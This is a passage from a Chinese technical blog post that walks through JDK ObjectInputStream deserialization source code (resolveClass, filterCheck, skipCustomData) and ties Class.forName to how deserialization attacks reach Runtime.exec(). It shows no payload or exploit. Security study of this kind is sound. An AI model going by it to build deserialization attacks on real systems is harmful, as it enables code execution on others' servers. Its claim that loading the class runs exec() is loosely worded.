class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        Object rep = desc.invokeReadResolve(obj);</span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// Filter the replacement object</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>ObjectStreamClass desc = readClassDesc(false);</code>这句进入<code>readClassDesc</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readClassDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span> tc = bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readClassDesc</code>读取类描述符，所以进入<code>case TC_CLASSDESC : readNonProxyDesc</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads in and returns class descriptor for a class that is not a dynamic</span></span><br><span class="line"><span class="comment"> * proxy class.  Sets passHandle to class descriptor's assigned handle.  If</span></span><br><span class="line"><span class="comment"> * class descriptor cannot be resolved to a class in the local VM, a</span></span><br><span class="line"><span class="comment"> * ClassNotFoundException is associated with the descriptor's handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">    <span class="keyword">int</span> descHandle = handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();<span class="comment">//进入</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = <span class="keyword">null</span>;</span><br><span class="line">    ClassNotFoundException resolveEx = <span class="keyword">null</span>;</span><br><span class="line">    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> checksRequired = isCustomSubclass();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        depth++;</span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着进入到<code>readClassDescriptor</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ObjectStreamClass <span class="title">readClassDescriptor</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line">    desc.readNonProxy(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>readNonProxy</code>，读取desc对应的元数据信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readNonProxy</span><span class="params">(ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 类名</span></span><br><span class="line">    name = in.readUTF();</span><br><span class="line">    <span class="comment">// serialVersionUID</span></span><br><span class="line">    suid = Long.valueOf(in.readLong());</span><br><span class="line">    isProxy = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> flags = in.readByte();</span><br><span class="line">    hasWriteObjectData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="number">0</span>);</span><br><span class="line">    hasBlockExternalData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="number">0</span>);</span><br><span class="line">    externalizable =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">boolean</span> sflag =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (externalizable &amp;&amp; sflag) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            name, <span class="string">"serializable and externalizable flags conflict"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    serializable = externalizable || sflag;</span><br><span class="line">    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="number">0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero serialVersionUID: "</span> + suid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> numFields = in.readShort();</span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; numFields != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero field count: "</span> + numFields);</span><br><span class="line">    &#125;</span><br><span class="line">    fields = (numFields &gt; <span class="number">0</span>) ?</span><br><span class="line">        <span class="keyword">new</span> ObjectStreamField[numFields] : NO_FIELDS;</span><br><span class="line">  <span class="comment">// 从字节流中读取每一个字段的信息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numFields; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> tcode = (<span class="keyword">char</span>) in.readByte();</span><br><span class="line">        String fname = in.readUTF();</span><br><span class="line">        String signature = ((tcode == <span class="string">'L'</span>) || (tcode == <span class="string">'['</span>)) ?</span><br><span class="line">            in.readTypeString() : <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; tcode &#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fields[i] = <span class="keyword">new</span> ObjectStreamField(fname, signature, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">                <span class="string">"invalid descriptor for field "</span> + fname).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    computeFieldOffsets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fields其实是类中每个字段的信息，包括：字段名称，字段类型，字段代码。</p><p>序列化操作中，在<code>writeNonProxy</code>中写入的<code>TypeCode</code>、<code>fieldName</code>、<code>fieldType</code>在这里被读取。</p><p>之后会回到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">readNonProxyDesc&#123;</span><br><span class="line">  ...</span><br><span class="line">ObjectStreamClass readDesc = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();<span class="comment">//进入-继续</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = <span class="keyword">null</span>;</span><br><span class="line">    ClassNotFoundException resolveEx = <span class="keyword">null</span>;</span><br><span class="line">    bin.setBlockDataMode(<span class="keyword">true</span>);<span class="comment">//开启data-block模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> checksRequired = isCustomSubclass();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="keyword">null</span>) &#123;<span class="comment">//进入</span></span><br><span class="line">            resolveEx = <span class="keyword">new</span> ClassNotFoundException(<span class="string">"null class"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        depth++;</span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>resolveClass</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到<code>Class.forName()</code>操作，会尝试加载本地类。</p><p>其实就是反序列化的根本原因，Runtime类在这里被加载，执行了exec()</p><blockquote><p>序列化操作中，oos的<code>annotateClass</code>、<code>annotateProxyClass</code>和<code>replaceObject</code>方法 </p><p>反序列化操作中对应<code>resolveClass</code>、<code>resolveProxyClass</code>、<code>resolveObject</code>方法</p></blockquote><p>执行结束之后该进入<code>filterCheck(cl, -1);</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">filterCheck</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">int</span> arrayLength)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> InvalidClassException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        RuntimeException ex = <span class="keyword">null</span>;</span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            status = serialFilter.checkInput(<span class="keyword">new</span> FilterValues(clazz, arrayLength,</span><br><span class="line">                    totalObjectRefs, depth, bin.getBytesRead()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// Preventive interception of an exception to log</span></span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="keyword">null</span>  ||</span><br><span class="line">                status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            <span class="comment">// Debug logging of filter checks that fail</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.infoLogger != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Logging.infoLogger.info(</span><br><span class="line">                        <span class="string">"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;"</span>,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(),</span><br><span class="line">                        Objects.toString(ex, <span class="string">"n/a"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            InvalidClassException ice = <span class="keyword">new</span> InvalidClassException(<span class="string">"filter status: "</span> + status);</span><br><span class="line">            ice.initCause(ex);</span><br><span class="line">            <span class="keyword">throw</span> ice;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Trace logging for those that succeed</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.traceLogger != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Logging.traceLogger.finer(</span><br><span class="line">                        <span class="string">"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;"</span>,</span><br><span class="line">                        status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(),</span><br><span class="line">                        Objects.toString(ex, <span class="string">"n/a"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果serialFilter非空，那么调用序列化筛选器，这个筛选器调用了<code>serialFilter.checkInput</code>方法检查序列化数据，如果检测出来了异常，那么会令<code>status</code>为<code>Status.REJECTED</code>状态，<code>filterCheck</code>将会根据<code>serialFilter.checkInput</code>的检查结果来决定是否执行反序列化，如果<code>checkInput()</code>方法返回<code>Status.REJECTED</code>，反序列化将会被阻止，并抛出<code>InvalidClassException()</code>错误：</p></blockquote><p>如果checkInput()方法返回<code>Status.ALLOWED</code>，说明程序允许反序列化。</p><p>回到上一个流程，该轮到：<code>skipCustomData();</code>方法：</p><p>在结束了反序列化内容检测后，会调用<code>skipCustomData</code>方法跳过所有数据块和对象，直到遇到<code>TC_ENDBLOCKDATA</code>标识：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Skips over all block data and objects until TC_ENDBLOCKDATA is</span></span><br><span class="line"><span class="comment"> * encountered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">skipCustomData</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> oldHandle = passHandle;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.getBlockDataMode()) &#123;</span><br><span class="line">            bin.skipBlockData();</span><br><span class="line">            bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (bin.peekByte()) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                bin.readByte();</span><br><span class="line">                passHandle = oldHandle;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                readObject0(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来回到主线：<code>readNonProxyDesc</code>函数</p><p>该来到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    totalObjectRefs++;</span><br><span class="line">    depth++;</span><br><span class="line">    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="keyword">false</span>)); <span class="comment">// 1</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    depth--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handles.finish(descHandle);<span class="comment">//2</span></span><br><span class="line">passHandle = descHandle;</span><br></pre></td></tr></table></figure><p>这里首先调用<code>ObjectStreamClass</code>中的<code>initNonProxy</code>方法，在这个方法里会初始化表示非代理类的类描述符。</p><p>接下来会调用调用<code>handles</code>的<code>finish</code>方法完成引用<code>Handle</code>的赋值操作</p><p>最后将结果赋值给<code>passHandle</code>成员属性（初始定义为<code>private int passHandle = NULL_HANDLE;</code>）</p><p>到这里，<code>readNonProxyDesc</code>结束</p><p>将得到的desc类描述信息赋值给<code>descriptor</code>变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readNonProxyDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ObjectStreamClass desc = <span class="keyword">new</span> ObjectStreamClass();</span><br><span class="line"><span class="keyword">int</span> descHandle = handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">passHandle = NULL_HANDLE;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readClassDesc&#123;</span><br><span class="line"><span class="keyword">case</span> TC_CLASSDESC:<span class="type"></span></span><br><span class="line"><span class="type">            descriptor </span>= readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="type"></span></span><br><span class="line"><span class="type">            throw new StreamCorruptedException</span>(</span><br><span class="line">                <span class="keyword">String</span>.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> 